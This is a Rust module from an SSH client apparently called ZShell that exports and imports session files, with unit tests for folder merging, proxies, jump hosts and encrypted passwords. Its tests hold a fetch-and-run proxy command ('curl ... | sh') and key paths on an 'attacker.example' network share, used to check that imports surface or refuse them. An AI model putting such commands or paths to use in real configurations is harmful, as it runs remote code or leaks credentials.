//! Exporting sessions (with their folders and proxies) to a JSON file and importing them
//! back, for backups and for moving to another computer. With their saved passwords the whole
//! file is encrypted, with a key from a passphrase given for it (see `envelope.rs`); without,
//! it is in clear.

use std::collections::{HashMap, HashSet, VecDeque};
use std::path::Path;

use serde::{Deserialize, Serialize};
use ts_rs::TS;

use crate::config::{Additions, Snapshot};

use crate::crypto::Kdf;
use crate::envelope::{self, Envelope, Invalid, Unopened};
use crate::error::{Error, Result};
use crate::model::ForwardRule;
use crate::model::{Connection, Folder, Item, Profile};
use crate::model::{Proxy, ProxyKind};
use crate::persist::{unique_ids, write_atomic};
use crate::vault::{Account, Passwords};

const FORMAT: &str = "zshell-sessions";
/// 3 since the file is an envelope that may be encrypted as a whole (ZShell 3.0); files of
/// earlier versions are not read.
const VERSION: u32 = 3;

/// How the file is protected, as its header says.
#[derive(Serialize, Deserialize)]
#[serde(tag = "protection", rename_all = "camelCase")]
enum Sealing {
    None,
    /// Encrypted with a key from the file's passphrase.
    Password {
        kdf: Kdf,
    },
}

#[derive(Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
struct SessionsFile {
    folders: Vec<Folder>,
    profiles: Vec<Profile>,
    proxies: Vec<Proxy>,
    /// The order the folders and sessions were shown in (see `config`); not in files of
    /// versions before 3.3, where folders come first.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    order: Vec<Item>,
    /// Only in an encrypted file; by ids in the file.
    #[serde(skip_serializing_if = "Passwords::is_empty")]
    passwords: Passwords,
}

/// What a sessions file holds, as it would be imported, and a digest of the file: importing
/// checks that the file is still what was shown.
#[derive(Debug, Serialize, TS)]
#[ts(rename = "SessionsScan")]
#[serde(rename_all = "camelCase")]
pub struct Scan {
    pub candidates: Vec<Candidate>,
    pub digest: String,
}

/// A session in a file, as it would be imported.
#[derive(Debug, Serialize, TS)]
#[ts(rename = "SessionCandidate")]
#[serde(rename_all = "camelCase")]
pub struct Candidate {
    pub id: String,
    pub name: String,
    /// As in the file: its jump hosts and proxy are ids in the file.
    pub connection: Connection,
    /// The names of the folders it is in, outermost first.
    pub folder: Vec<String>,
    /// The names of its jump hosts.
    pub jump_hosts: Vec<String>,
    /// The name of its proxy.
    pub proxy: Option<String>,
    /// The command its proxy runs, for a command proxy: importing it means that this
    /// command runs when the session connects.
    pub proxy_command: Option<String>,
    /// The name of an existing session with the same name or address; such sessions are not
    /// imported again.
    pub existing: Option<String>,
    /// Forwarding rules that start when it connects, as they will be saved: importing them
    /// means listening on those ports.
    pub auto_forwards: Vec<ForwardRule>,
    /// Commands typed into its shell once it connects: importing them means running them on
    /// the server, which the file may name as one of the user's own.
    pub login_commands: Vec<String>,
    /// The other sessions in the file (ids) that importing it imports too: the jump hosts it
    /// goes through, and theirs, that don't exist here. Their proxies and forwarding rules
    /// come with them; with jump hosts, the first one's proxy is the one used.
    pub brings: Vec<String>,
}

/// What is exported: the sessions, their folders and proxies, and the order of the first two.
pub struct Contents {
    pub folders: Vec<Folder>,
    pub proxies: Vec<Proxy>,
    pub profiles: Vec<Profile>,
    pub order: Vec<Item>,
}

/// Writes the sessions to `path`; with their `passwords` if given, the whole file encrypted
/// with a key from the passphrase given with them. Blocks while the key is derived.
pub fn export(path: &Path, contents: Contents, passwords: Option<(&str, Passwords)>) -> Result<()> {
    let (sealing, key, passwords) = match passwords {
        None => (Sealing::None, None, Passwords::default()),
        Some((passphrase, passwords)) => {
            let kdf = Kdf::new();
            let key = kdf.derive(passphrase).expect("the current parameters");
            (Sealing::Password { kdf }, Some(key), passwords)
        }
    };
    let Contents { folders, proxies, profiles, order } = contents;
    let file = SessionsFile { folders, profiles, proxies, order, passwords };
    let failed = || Error::new("export.writeFailed").param("path", path.display());
    let bytes = envelope::write(FORMAT, VERSION, &sealing, key.as_ref(), &file).ok_or_else(failed)?;
    write_atomic(path, &bytes).map_err(|e| failed().detail(e))
}

/// What importing the file would add; an encrypted file takes its `passphrase`
/// (`import.passphraseRequired` without one). Blocks while the key is derived.
pub fn scan(path: &Path, passphrase: Option<&str>, existing: &[Profile]) -> Result<Scan> {
    let (file, digest) = read(path, passphrase, None)?;
    let names: HashMap<&str, &str> = file.profiles.iter().map(|p| (p.id.as_str(), p.name.as_str())).collect();
    let candidates = file
        .profiles
        .iter()
        .map(|p| {
            let proxy = p.proxy().and_then(|id| file.proxies.iter().find(|proxy| proxy.id == id));
            Candidate {
                id: p.id.clone(),
                name: p.name.clone(),
                connection: p.connection.clone(),
                folder: folder_path(&file.folders, p.folder.as_deref()),
                jump_hosts: p.jump_hosts().iter().filter_map(|j| names.get(j.as_str()).map(|n| n.to_string())).collect(),
                proxy: proxy.map(|proxy| proxy.name.clone()),
                proxy_command: proxy.filter(|proxy| proxy.kind == ProxyKind::Command).map(|proxy| proxy.command.clone()),
                existing: duplicate_of(p, existing).map(|e| e.name.clone()),
                auto_forwards: p.forwards().iter().filter(|f| f.auto_start).filter_map(|f| f.clone().normalize().ok()).collect(),
                login_commands: p.login_commands.iter().filter(|c| !c.trim().is_empty()).cloned().collect(),
                brings: to_import(&file, [p.id.clone()], existing).0.into_iter().filter(|id| *id != p.id).collect(),
            }
        })
        .collect();
    Ok(Scan { candidates, digest })
}

/// The sessions in `file` (ids) that importing `selected` adds, in the order found: those and
/// the jump hosts they go through, and theirs, except those that exist here (`existing`),
/// which are used instead: file id → the existing one's id.
fn to_import(
    file: &SessionsFile,
    selected: impl IntoIterator<Item = String>,
    existing: &[Profile],
) -> (Vec<String>, HashMap<String, String>) {
    let by_id: HashMap<&str, &Profile> = file.profiles.iter().map(|p| (p.id.as_str(), p)).collect();
    let mut imported = Vec::new();
    let mut found: HashMap<String, String> = HashMap::new();
    let mut queue: VecDeque<String> = selected.into_iter().collect();
    while let Some(id) = queue.pop_front() {
        let Some(profile) = by_id.get(id.as_str()) else { continue };
        if imported.contains(&id) || found.contains_key(&id) {
            continue;
        }
        match duplicate_of(profile, existing) {
            Some(here) => {
                found.insert(id, here.id.clone());
            }
            None => {
                queue.extend(profile.jump_hosts().iter().cloned());
                imported.push(id);
            }
        }
    }
    (imported, found)
}

/// What to add for importing the sessions `selected` (ids in the file): new folders, proxies
/// and profiles, with new ids, and the passwords of the new sessions and proxies. Jump hosts
/// and proxies come along unless they already exist here, in which case the existing one is
/// used (with its own password); folders are matched by name and merged. `digest` is the one
/// `scan` gave: a file that has changed since isn't imported, since what it would add (proxy
/// commands, forwarding rules) isn't what was shown. Blocks while the key is derived.
pub fn plan(path: &Path, passphrase: Option<&str>, selected: &[String], digest: &str, here: &Snapshot) -> Result<Additions> {
    let folders = here.folders;
    let (file, _) = read(path, passphrase, Some(digest))?;

    // File id → the id of the session it becomes (new, or an existing duplicate).
    let (imported, mut ids) = to_import(&file, selected.iter().cloned(), here.profiles);
    for id in &imported {
        ids.insert(id.clone(), uuid::Uuid::new_v4().to_string());
    }
    let imported: HashSet<String> = imported.into_iter().collect();
    let mut passwords = Passwords::default();
    for id in &imported {
        passwords.set(Account::Profile(&ids[id]), file.passwords.get(Account::Profile(id)));
    }

    // File proxy id → the id of the proxy it becomes, for the proxies the imported use.
    let mut proxy_ids: HashMap<&str, String> = HashMap::new();
    let mut proxies = Vec::new();
    for profile in file.profiles.iter().filter(|p| imported.contains(&p.id)) {
        let Some(proxy) = profile.proxy().and_then(|id| file.proxies.iter().find(|proxy| proxy.id == id)) else {
            continue;
        };
        if proxy_ids.contains_key(proxy.id.as_str()) {
            continue;
        }
        // The same name is the same proxy only if it is of the same kind: an HTTP proxy in the
        // file must not quietly become a command proxy here.
        let existing = here
            .proxies
            .iter()
            .find(|e| e.name == proxy.name && e.kind == proxy.kind)
            .or_else(|| here.proxies.iter().find(|e| e.same_as(proxy)));
        let id = match existing {
            Some(existing) => existing.id.clone(),
            None => {
                let taken = |name: &str| here.proxies.iter().chain(&proxies).any(|p| p.name == name);
                let name = free_name(&proxy.name, taken);
                let file_proxy_id = proxy.id.clone();
                let mut proxy = Proxy { id: uuid::Uuid::new_v4().to_string(), name, ..proxy.clone() };
                proxy.normalize().map_err(|e| Error::new("import.invalidProxy").param("name", &proxy.name).detail(e))?;
                let id = proxy.id.clone();
                proxies.push(proxy);
                passwords.set(Account::Proxy(&id), file.passwords.get(Account::Proxy(&file_proxy_id)));
                id
            }
        };
        proxy_ids.insert(&proxy.id, id);
    }

    let mut merger = FolderMerger { file: &file.folders, existing: folders, added: Vec::new(), origins: HashMap::new() };
    let new_profiles = file
        .profiles
        .iter()
        .filter(|p| imported.contains(&p.id))
        .map(|p| {
            let mut profile = Profile { id: ids[&p.id].clone(), folder: p.folder.as_deref().and_then(|f| merger.resolve(f)), ..p.clone() };
            if let Some(remote) = profile.connection.remote_mut() {
                remote.jump_hosts = remote.jump_hosts.iter().filter_map(|j| ids.get(j).cloned()).collect();
                remote.proxy = remote.proxy.as_deref().and_then(|id| proxy_ids.get(id).cloned());
            }
            // As saving does: an empty bind address becomes localhost rather than every
            // interface of the server, for one.
            profile.normalize_imported().map_err(|e| Error::new("import.invalidSession").param("name", &p.name).detail(e))?;
            Ok(profile)
        })
        .collect::<Result<Vec<Profile>>>()?;

    // The new folders and sessions in the file's order (the folders, where the folder they
    // were made for was).
    let rank = file_rank(&file);
    let mut order: Vec<(usize, Item)> = merger
        .added
        .iter()
        .map(|f| (rank[&Item::Folder { id: merger.origins[&f.id].clone() }], Item::Folder { id: f.id.clone() }))
        .collect();
    for (id, new_id) in ids.iter().filter(|(id, _)| imported.contains(*id)) {
        order.push((rank[&Item::Profile { id: id.clone() }], Item::Profile { id: new_id.clone() }));
    }
    order.sort_by_key(|(rank, _)| *rank);
    let order = order.into_iter().map(|(_, item)| item).collect();
    Ok(Additions { folders: merger.added, proxies, profiles: new_profiles, order, passwords })
}

/// Where each folder and session in the file was shown: as its order says, those it leaves out
/// after the others (all of them in a file of an older version), folders first.
fn file_rank(file: &SessionsFile) -> HashMap<Item, usize> {
    let folders = file.folders.iter().map(|f| Item::Folder { id: f.id.clone() });
    let items: Vec<Item> = folders.chain(file.profiles.iter().map(|p| Item::Profile { id: p.id.clone() })).collect();
    let exists: HashSet<&Item> = items.iter().collect();
    let mut rank = HashMap::new();
    for item in file.order.iter().filter(|item| exists.contains(item)).chain(&items) {
        let next = rank.len();
        rank.entry(item.clone()).or_insert(next);
    }
    rank
}

/// The file, opened with `passphrase` if it is encrypted, and a digest of it (SHA-256, in
/// hex): `import.fileChanged` if it isn't `digest`, when given.
fn read(path: &Path, passphrase: Option<&str>, digest: Option<&str>) -> Result<(SessionsFile, String)> {
    use sha2::Digest;

    let bytes = std::fs::read(path).map_err(|e| Error::new("import.readFailed").param("path", path.display()).detail(e))?;
    let read_digest: String = sha2::Sha256::digest(&bytes).iter().map(|b| format!("{b:02x}")).collect();
    if digest.is_some_and(|digest| digest != read_digest) {
        return Err(Error::new("import.fileChanged").param("path", path.display()));
    }
    let parse_failed = |detail: Option<String>| {
        let error = Error::new("import.parseFailed").param("path", path.display());
        match detail {
            Some(detail) => error.detail(detail),
            None => error,
        }
    };
    let envelope: Envelope<Sealing> = envelope::parse(&bytes, FORMAT, VERSION).map_err(|invalid| match invalid {
        Invalid::Format => Error::new("import.notSessionsFile").param("path", path.display()),
        Invalid::Version(_) => Error::new("import.unsupportedVersion").param("path", path.display()),
        Invalid::Damaged(detail) => parse_failed(detail),
    })?;
    let key = match &envelope.header {
        Sealing::None => None,
        Sealing::Password { kdf } => {
            let passphrase = passphrase.filter(|p| !p.is_empty()).ok_or_else(|| Error::new("import.passphraseRequired"))?;
            Some(kdf.derive(passphrase).ok_or_else(|| Error::new("import.unsupportedEncryption").param("path", path.display()))?)
        }
    };
    let mut file: SessionsFile = envelope.open(key.as_ref()).map_err(|unopened| match unopened {
        Unopened::WrongKey => Error::new("import.wrongPassphrase"),
        Unopened::Damaged(detail) => parse_failed(detail),
    })?;
    // A hand-written file may leave ids out or repeat them; references go to the first.
    unique_ids(file.profiles.iter_mut().map(|p| &mut p.id));
    unique_ids(file.proxies.iter_mut().map(|p| &mut p.id));
    unique_ids(file.folders.iter_mut().map(|f| &mut f.id));
    Ok((file, read_digest))
}

/// An existing session with the same name, else one that connects to the same place (see
/// [`Profile::same_target`]). The name only counts for the same protocol: a Telnet session that happens to share its
/// name must not stand in for an SSH one (and become a jump host).
fn duplicate_of<'a>(profile: &Profile, existing: &'a [Profile]) -> Option<&'a Profile> {
    existing
        .iter()
        .find(|e| e.name == profile.name && e.protocol() == profile.protocol())
        .or_else(|| existing.iter().find(|e| e.same_target(profile)))
}

/// The names of `folder` and the folders around it, outermost first.
fn folder_path(folders: &[Folder], folder: Option<&str>) -> Vec<String> {
    folder_chain(folders, folder).into_iter().map(|f| f.name.clone()).collect()
}

/// `folder` and the folders around it, outermost first.
fn folder_chain<'a>(folders: &'a [Folder], folder: Option<&str>) -> Vec<&'a Folder> {
    let mut chain = Vec::new();
    let mut current = folder;
    while let Some(id) = current {
        let Some(f) = folders.iter().find(|f| f.id == id) else { break };
        if chain.len() > folders.len() {
            break; // A cycle in a hand-edited file.
        }
        chain.push(f);
        current = f.parent.as_deref();
    }
    chain.reverse();
    chain
}

/// Maps the file's folders onto existing ones with the same name in the same place, adding
/// those that don't exist.
struct FolderMerger<'a> {
    file: &'a [Folder],
    existing: &'a [Folder],
    added: Vec<Folder>,
    /// The id of each added folder → that of the folder in the file it was made for.
    origins: HashMap<String, String>,
}

impl FolderMerger<'_> {
    fn resolve(&mut self, file_id: &str) -> Option<String> {
        let mut parent: Option<String> = None;
        for in_file in folder_chain(self.file, Some(file_id)) {
            let name = &in_file.name;
            let found = self.existing.iter().chain(&self.added).find(|f| f.name == *name && f.parent == parent).map(|f| f.id.clone());
            let id = found.unwrap_or_else(|| {
                let folder = Folder { id: uuid::Uuid::new_v4().to_string(), name: name.clone(), parent: parent.clone() };
                self.added.push(folder.clone());
                self.origins.insert(folder.id.clone(), in_file.id.clone());
                folder.id
            });
            parent = Some(id);
        }
        parent
    }
}

/// `name`, or `name (2)`, `name (3)`... if `taken`.
fn free_name(name: &str, taken: impl Fn(&str) -> bool) -> String {
    if !taken(name) {
        return name.to_owned();
    }
    (2..).map(|n| format!("{name} ({n})")).find(|candidate| !taken(candidate)).unwrap()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{AuthMethod, Remote, SshOptions};

    fn profile(id: &str, name: &str, host: &str, folder: Option<&str>, jumps: &[&str]) -> Profile {
        let remote = Remote { jump_hosts: jumps.iter().map(|j| j.to_string()).collect(), ..Remote::new(host.into(), 22, "alice".into()) };
        Profile { id: id.into(), folder: folder.map(Into::into), ..Profile::new(name.into(), Connection::Ssh(SshOptions::new(remote))) }
    }

    fn with_proxy(mut profile: Profile, proxy: &str) -> Profile {
        profile.connection.remote_mut().unwrap().proxy = Some(proxy.into());
        profile
    }

    fn folder(id: &str, name: &str, parent: Option<&str>) -> Folder {
        Folder { id: id.into(), name: name.into(), parent: parent.map(Into::into) }
    }

    #[test]
    fn round_trips_and_merges_with_existing_sessions() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-{}.json", std::process::id()));
        let folders = vec![folder("f1", "Work", None), folder("f2", "DB", Some("f1"))];
        let profiles = vec![
            profile("bastion", "bastion", "bastion.example.com", Some("f1"), &[]),
            profile("db", "db", "db.internal", Some("f2"), &["bastion"]),
            profile("web", "web", "web.example.com", None, &["bastion"]),
        ];
        export(&path, Contents { folders, proxies: Vec::new(), profiles, order: Vec::new() }, None).unwrap();

        // Here: a "Work" folder and the bastion already exist (same address, other name).
        let here_folders = vec![folder("w", "Work", None)];
        let here_profiles = vec![profile("b2", "jump", "bastion.example.com", None, &[])];
        let Scan { candidates, digest } = scan(&path, None, &here_profiles).unwrap();
        assert_eq!(candidates[0].existing.as_deref(), Some("jump"));
        assert_eq!(candidates[1].folder, ["Work", "DB"]);
        assert_eq!(candidates[1].jump_hosts, ["bastion"]);

        let here = Snapshot { profiles: &here_profiles, folders: &here_folders, proxies: &[] };
        let Additions { folders: new_folders, profiles: new_profiles, proxies, .. } =
            plan(&path, None, &["db".into()], &digest, &here).unwrap();
        assert!(proxies.is_empty());
        // Only "DB" is new, inside the existing "Work".
        assert_eq!(new_folders.len(), 1);
        assert_eq!((new_folders[0].name.as_str(), new_folders[0].parent.as_deref()), ("DB", Some("w")));
        // db comes with new ids, through the existing bastion.
        assert_eq!(new_profiles.len(), 1);
        assert_ne!(new_profiles[0].id, "db");
        assert_eq!(new_profiles[0].jump_hosts(), ["b2"]);
        assert_eq!(new_profiles[0].folder.as_deref(), Some(new_folders[0].id.as_str()));
        std::fs::remove_file(&path).unwrap();
    }

    /// New folders and sessions come in the order the file showed them, sessions and folders
    /// mixed; a file without an order (an older version's) has folders first.
    #[test]
    fn imports_in_the_file_s_order() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-order-{}.json", std::process::id()));
        let folders = vec![folder("f1", "Work", None)];
        let profiles = vec![profile("web", "web", "web.example.com", None, &[]), profile("db", "db", "db.internal", Some("f1"), &[])];
        let item = |kind: &str, id: &str| match kind {
            "folder" => Item::Folder { id: id.into() },
            _ => Item::Profile { id: id.into() },
        };
        let names = |additions: &Additions| -> Vec<String> {
            let name = |item: &Item| match item {
                Item::Folder { id } => additions.folders.iter().find(|f| f.id == *id).unwrap().name.clone(),
                Item::Profile { id } => additions.profiles.iter().find(|p| p.id == *id).unwrap().name.clone(),
            };
            additions.order.iter().map(name).collect()
        };
        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        let selected = ["db".to_owned(), "web".to_owned()];

        let order = vec![item("profile", "web"), item("folder", "f1"), item("profile", "db")];
        export(&path, Contents { folders: folders.clone(), proxies: Vec::new(), profiles: profiles.clone(), order }, None).unwrap();
        let Scan { digest, .. } = scan(&path, None, &[]).unwrap();
        assert_eq!(names(&plan(&path, None, &selected, &digest, &here).unwrap()), ["web", "Work", "db"]);

        export(&path, Contents { folders, proxies: Vec::new(), profiles, order: Vec::new() }, None).unwrap();
        let Scan { digest, .. } = scan(&path, None, &[]).unwrap();
        assert_eq!(names(&plan(&path, None, &selected, &digest, &here).unwrap()), ["Work", "web", "db"]);
        std::fs::remove_file(&path).unwrap();
    }

    /// What a hand-edited or someone else's file can hold: missing and repeated ids, a name
    /// shared with a Telnet session here, forwarding rules that saving would tidy.
    #[test]
    fn imports_untidy_files_safely() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-untidy-{}.json", std::process::id()));
        let forward = ForwardRule {
            id: String::new(),
            kind: crate::model::ForwardKind::Remote,
            bind_host: String::new(),
            bind_port: 9000,
            target_host: "localhost".into(),
            target_port: 3000,
            description: String::new(),
            auto_start: true,
        };
        let profiles = vec![
            profile("router", "router", "router.lan", None, &[]),
            {
                let mut db = profile("db", "db", "db.internal", None, &["router"]);
                let Connection::Ssh(ssh) = &mut db.connection else { unreachable!() };
                ssh.forwards = vec![forward];
                db.login_commands = vec!["cd /srv".into(), "  ".into()];
                db
            },
            profile("", "a", "a.internal", None, &[]),
            profile("", "b", "b.internal", None, &[]),
        ];
        export(&path, Contents { folders: Vec::new(), proxies: Vec::new(), profiles, order: Vec::new() }, None).unwrap();

        let telnet = Profile {
            connection: Connection::Telnet(Remote::new("10.0.0.1".into(), 23, String::new())),
            ..profile("t", "router", "", None, &[])
        };
        let Scan { candidates, digest, .. } = scan(&path, None, std::slice::from_ref(&telnet)).unwrap();
        assert_eq!(candidates[0].existing, None);
        assert_eq!(candidates[1].auto_forwards[0].bind_host, "localhost");
        assert_eq!(candidates[1].login_commands, ["cd /srv"]);
        assert_ne!(candidates[2].id, candidates[3].id);

        let ids: Vec<String> = candidates.iter().map(|c| c.id.clone()).collect();
        let here = Snapshot { profiles: std::slice::from_ref(&telnet), folders: &[], proxies: &[] };
        let Additions { profiles: new, .. } = plan(&path, None, &ids, &digest, &here).unwrap();
        let names: Vec<&str> = new.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["router", "db", "a", "b"]);
        // The file's own router is the jump host, not the Telnet session.
        assert_eq!(new[1].jump_hosts(), std::slice::from_ref(&new[0].id));
        // As when saved: not every interface of the server.
        assert_eq!(new[1].forwards()[0].bind_host, "localhost");
        assert!(!new[1].forwards()[0].id.is_empty());
        std::fs::remove_file(&path).unwrap();
    }

    /// A key on another computer's share would be read (signing in there) as soon as the
    /// session is edited or connects.
    #[test]
    fn refuses_keys_on_network_paths() {
        for key_path in [r"\\attacker.example\share\id_ed25519", "//attacker.example/share/id_ed25519", r"\\?\UNC\host\k"] {
            let path = std::env::temp_dir().join(format!("zshell-sessions-unc-{}.json", uuid::Uuid::new_v4()));
            let mut db = profile("db", "db", "db.internal", None, &[]);
            let Connection::Ssh(ssh) = &mut db.connection else { unreachable!() };
            ssh.auth = AuthMethod::PublicKey { key_path: key_path.into() };
            export(&path, Contents { folders: Vec::new(), proxies: Vec::new(), profiles: vec![db], order: Vec::new() }, None).unwrap();
            let Scan { candidates, digest, .. } = scan(&path, None, &[]).unwrap();
            let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
            let error = plan(&path, None, &[candidates[0].id.clone()], &digest, &here).err().unwrap();
            assert_eq!(error.code(), "import.invalidSession", "{key_path}");
            std::fs::remove_file(&path).unwrap();
        }
    }

    fn proxy(id: &str, name: &str, kind: ProxyKind, command: &str) -> Proxy {
        Proxy {
            id: id.into(),
            name: name.into(),
            kind,
            host: "proxy.lan".into(),
            port: 1080,
            username: String::new(),
            command: command.into(),
        }
    }

    #[test]
    fn brings_proxies_along() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-proxies-{}.json", std::process::id()));
        let proxies = vec![
            proxy("x1", "corp", ProxyKind::Socks5, ""),
            proxy("x2", "cf", ProxyKind::Command, "cloudflared access ssh --hostname %h"),
            proxy("x3", "unused", ProxyKind::Http, ""),
        ];
        let profiles = vec![
            with_proxy(profile("a", "a", "a.internal", None, &[]), "x1"),
            with_proxy(profile("b", "b", "b.internal", None, &[]), "x2"),
            with_proxy(profile("c", "c", "c.internal", None, &[]), "missing"),
            with_proxy(profile("d", "d", "d.internal", None, &[]), "x1"),
        ];
        export(&path, Contents { folders: Vec::new(), proxies, profiles, order: Vec::new() }, None).unwrap();

        let Scan { candidates, digest, .. } = scan(&path, None, &[]).unwrap();
        assert_eq!(candidates[0].proxy.as_deref(), Some("corp"));
        assert_eq!(candidates[0].proxy_command, None);
        assert_eq!(candidates[1].proxy_command.as_deref(), Some("cloudflared access ssh --hostname %h"));
        assert_eq!(candidates[2].proxy, None);

        // Here the SOCKS proxy exists under another name.
        let here_proxies = vec![proxy("mine", "office", ProxyKind::Socks5, "")];
        let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
        let ids: Vec<String> = ["a", "b", "c", "d"].map(String::from).to_vec();
        let planned = plan(&path, None, &ids, &digest, &here).unwrap();
        // Only the command proxy is new; the unused one isn't imported.
        assert_eq!(planned.proxies.len(), 1);
        assert_eq!(planned.proxies[0].name, "cf");
        assert_ne!(planned.proxies[0].id, "x2");
        let used: Vec<_> = planned.profiles.iter().map(|p| p.proxy()).collect();
        assert_eq!(used, [Some("mine"), Some(planned.proxies[0].id.as_str()), None, Some("mine")]);

        // A proxy here with the same name but of another kind is not the same one: the file's
        // is imported, under a name of its own.
        let here_proxies = vec![proxy("mine", "corp", ProxyKind::Command, "nc %h %p")];
        let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
        let planned = plan(&path, None, &["a".to_owned()], &digest, &here).unwrap();
        assert_eq!(planned.proxies.len(), 1);
        assert_eq!((planned.proxies[0].name.as_str(), planned.proxies[0].kind), ("corp (2)", ProxyKind::Socks5));
        assert_eq!(planned.profiles[0].proxy(), Some(planned.proxies[0].id.as_str()));
        std::fs::remove_file(&path).unwrap();
    }

    /// Importing a session imports the jump hosts it goes through, with their proxies: the
    /// scan says which, so that their commands are shown with it.
    #[test]
    fn shows_what_comes_with_a_session() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-brings-{}.json", std::process::id()));
        let proxies = vec![proxy("x", "fetch", ProxyKind::Command, "curl -s https://example.com/x | sh")];
        let profiles = vec![
            with_proxy(profile("bastion", "bastion", "bastion.example.com", None, &[]), "x"),
            profile("inner", "inner", "inner.internal", None, &["bastion"]),
            profile("db", "db", "db.internal", None, &["inner"]),
            profile("web", "web", "web.example.com", None, &[]),
        ];
        export(&path, Contents { folders: Vec::new(), proxies, profiles, order: Vec::new() }, None).unwrap();

        let Scan { candidates, digest, .. } = scan(&path, None, &[]).unwrap();
        let brings: Vec<&[String]> = candidates.iter().map(|c| c.brings.as_slice()).collect();
        assert_eq!(brings, [&[][..], &["bastion".to_owned()], &["inner".to_owned(), "bastion".to_owned()], &[]]);
        // A jump host that exists here is used rather than imported.
        let here_bastion = profile("b", "jump", "bastion.example.com", None, &[]);
        let Scan { candidates: with_bastion, .. } = scan(&path, None, std::slice::from_ref(&here_bastion)).unwrap();
        assert_eq!(with_bastion[2].brings, ["inner"]);

        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        let plan = plan(&path, None, &["db".into()], &digest, &here).unwrap();
        let names: Vec<&str> = plan.profiles.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, ["bastion", "inner", "db"]);
        assert_eq!(plan.proxies[0].command, "curl -s https://example.com/x | sh");

        // The file changed after it was shown: nothing is imported.
        let shown = std::fs::read(&path).unwrap();
        std::fs::write(&path, String::from_utf8(shown).unwrap().replace("example.com/x", "example.com/y")).unwrap();
        assert_eq!(plan_error(&path, &digest), "import.fileChanged");
        std::fs::remove_file(&path).unwrap();
    }

    #[test]
    fn carries_passwords_in_a_file_encrypted_with_a_passphrase() {
        let path = std::env::temp_dir().join(format!("zshell-sessions-passwords-{}.json", std::process::id()));
        let proxies = vec![Proxy { username: "u".into(), ..proxy("x", "corp", ProxyKind::Socks5, "") }];
        let profiles = vec![with_proxy(profile("a", "a", "a.internal", None, &[]), "x"), profile("b", "b", "b.internal", None, &[])];
        let mut passwords = Passwords::default();
        passwords.set(Account::Profile("a"), Some("secret-a"));
        passwords.set(Account::Proxy("x"), Some("secret-x"));
        export(&path, Contents { folders: Vec::new(), proxies, profiles, order: Vec::new() }, Some(("passphrase", passwords))).unwrap();
        // Nothing in clear, not even the hosts.
        let exported = std::fs::read_to_string(&path).unwrap();
        assert!(!exported.contains("secret") && !exported.contains("a.internal"));

        assert_eq!(scan(&path, None, &[]).unwrap_err().code(), "import.passphraseRequired");
        assert_eq!(scan(&path, Some("wrong"), &[]).unwrap_err().code(), "import.wrongPassphrase");
        let Scan { candidates, digest } = scan(&path, Some("passphrase"), &[]).unwrap();
        assert_eq!(candidates.len(), 2);

        // The new sessions and the new proxy get the passwords they had in the file.
        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        let planned = plan(&path, Some("passphrase"), &["a".to_owned(), "b".to_owned()], &digest, &here).unwrap();
        let new = &planned.passwords;
        assert_eq!(new.get(Account::Profile(&planned.profiles[0].id)), Some("secret-a"));
        assert_eq!(new.get(Account::Profile(&planned.profiles[1].id)), None);
        assert_eq!(new.get(Account::Proxy(&planned.proxies[0].id)), Some("secret-x"));

        // A proxy that exists here keeps its own password.
        let here_proxies = vec![proxy("mine", "corp", ProxyKind::Socks5, "")];
        let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
        let planned = plan(&path, Some("passphrase"), &["a".to_owned()], &digest, &here).unwrap();
        assert!(planned.passwords.proxies.is_empty() && planned.passwords.profiles.len() == 1);

        // A changed header (the parameters the key is derived with) doesn't open.
        let changed = exported.replace("\"protection\":\"password\"", "\"protection\":\"password\",\"x\":1");
        assert_ne!(changed, exported);
        std::fs::write(&path, changed).unwrap();
        assert_eq!(scan(&path, Some("passphrase"), &[]).unwrap_err().code(), "import.wrongPassphrase");
        std::fs::remove_file(&path).unwrap();
    }

    fn plan_error(path: &Path, digest: &str) -> &'static str {
        let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
        match plan(path, None, &["db".into()], digest, &here) {
            Ok(_) => "ok",
            Err(e) => e.code(),
        }
    }

    #[test]
    fn rejects_other_files() {
        let path = std::env::temp_dir().join(format!("zshell-not-sessions-{}.json", std::process::id()));
        std::fs::write(&path, r#"{"format":"something","version":1}"#).unwrap();
        assert_eq!(scan(&path, None, &[]).unwrap_err().code(), "import.notSessionsFile");
        std::fs::write(&path, r#"{"header":{"format":"zshell-vault","version":2,"protection":"none"},"data":{}}"#).unwrap();
        assert_eq!(scan(&path, None, &[]).unwrap_err().code(), "import.notSessionsFile");
        // Exported before 3.0, with the format at the top level.
        let old = r#"{"format":"zshell-sessions","version":2,"profiles":[]}"#;
        std::fs::write(&path, old).unwrap();
        assert_eq!(scan(&path, None, &[]).unwrap_err().code(), "import.notSessionsFile");
        std::fs::write(&path, r#"{"header":{"format":"zshell-sessions","version":4,"protection":"none"},"data":{}}"#).unwrap();
        assert_eq!(scan(&path, None, &[]).unwrap_err().code(), "import.unsupportedVersion");
        std::fs::remove_file(&path).unwrap();
    }
}
